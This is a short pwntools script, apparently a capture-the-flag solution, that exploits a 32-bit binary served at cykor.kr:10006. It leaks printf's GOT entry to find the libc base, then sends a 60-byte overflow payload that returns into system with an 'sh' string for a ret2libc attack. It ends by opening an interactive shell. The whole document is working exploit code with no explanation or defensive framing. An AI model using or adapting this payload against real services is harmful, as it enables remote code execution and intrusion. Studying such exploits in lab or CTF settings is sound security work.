from pwn import *

if __name__ == '__main__':
#	s = process('./20121209')
	s = remote('cykor.kr', 10006)
	elf = ELF('./20121209')
	libc = ELF('./libc.so.6.i386')

	sh = 0x804829e

	pause()

	print s.recv()

	s.sendline(str(elf.got['printf']))

	tmp = s.recv()
	print tmp
	
	printf_add = int(tmp.split('ss : ')[1][2:10], 16)
	libc_base = printf_add - libc.symbols['printf']
	system = libc_base + libc.symbols['system']

	print hex(printf_add), hex(libc_base), hex(system)

	payload = 'A'*60
	payload += p32(system)
	payload += 'BBBB'
	payload += p32(sh)

	s.sendline(payload)
	s.interactive()
	s.close()


